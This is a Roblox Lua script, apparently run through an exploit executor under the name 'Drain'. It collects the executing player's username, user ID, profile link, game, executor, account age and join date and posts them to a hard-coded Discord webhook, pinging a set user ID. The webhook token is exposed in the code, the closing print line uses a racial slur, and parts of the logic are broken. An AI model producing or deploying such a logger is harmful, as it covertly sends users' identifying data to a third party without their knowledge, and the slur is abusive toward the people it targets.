local Webhook = "https://discord.com/api/webhooks/1157505724067364945/te_KzvmrP4UC04k458gnLiF_B2rQWV5B5yunTHuyxs5c77ewApq3s7pdLoC16ZvGdAVm" -- your webhook
_G.Discord_UserID = "744471023834890330" -- ID To Ping on every execution, blank if no one wants to be pinged.

local player = game:GetService"Players".LocalPlayer
local joinTime = os.time() - (player.AccountAge*86400)
local joinDate = os.date("!*t", joinTime)
local premium = true
local alt = true
if player.MembershipType == Enum.MembershipType.Premium then
   premium = true
end

if not premium and player.AccountAge >= 70 then
    alt = "Possible"
elseif premium and player.AccountAge >= 70 then
   alt = false
end

local executor = identifyexecutor() or "Unknown"
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl
local msg = {
   ["username"] = "Drain.",
   ["avatar_url"] = "https://media.discordapp.net/attachments/1149385361844359318/1150077243821920389/images_20.jpeg",
   ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
   ["embeds"] = {
       {
           ["color"] = tonumber(tostring("0x32CD32")), --decimal
           ["title"] = "Drain executed.",
           ["thumbnail"] = {
               ["url"] = AvatarImage,
           },
           ["fields"] = {
                {
                   ["name"] = "Username",
                   ["value"] = "||"..player.Name.."||",
                   ["inline"] = true
                },
                {
                   ["name"] = "Display Name",
                   ["value"] = player.DisplayName,
                   ["inline"] = true
                },
                {
                   ["name"] = "UID",
                   ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
                   ["inline"] = true
                },
                {
                   ["name"] = "Game Id",
                   ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
                   ["inline"] = true
                },
                {
                   ["name"] = "Game Name",
                   ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                   ["inline"] = true
                },
                {
                   ["name"] = "Executor Used",
                   ["value"] = executor,
                   ["inline"] = true
                },
                {
                   ["name"] = "Alt",
                   ["value"] = alt,
                   ["inline"] = true
                },
                {
                   ["name"] = "Account Age",
                   ["value"] = player.AccountAge.."day(s)",
                   ["inline"] = true
                },
                {
                   ["name"] = "Date Joined",
                   ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
                   ["inline"] = true
                },
           },
           ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
       }
   }
}

if isfile("Workspace/readthis.txt") then
    print("Yokuso Watashiwa Soul Society")
    else
    request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    makefolder("Workspace")
    writefile("Workspace/Drain web.txt", "true")
    print("Got u nigga")
end
